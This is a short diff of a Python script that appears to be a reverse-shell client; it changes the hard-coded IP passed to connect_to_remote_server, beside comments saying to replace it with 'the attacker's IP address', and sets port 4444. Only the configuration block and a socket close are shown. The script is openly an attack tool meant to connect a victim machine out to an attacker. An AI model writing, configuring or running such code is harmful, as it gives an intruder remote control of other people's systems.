@@ -29,7 +29,7 @@ def connect_to_remote_server(ip, port):
     s.close()
 
 if __name__ == "__main__":
-    ip = "192.168.1.107"  # Replace with the attacker's IP address
+    ip = "192.168.1.100"  # Replace with the attacker's IP address
     port = 4444           # Replace with the attacker's port
     connect_to_remote_server(ip, port)
 
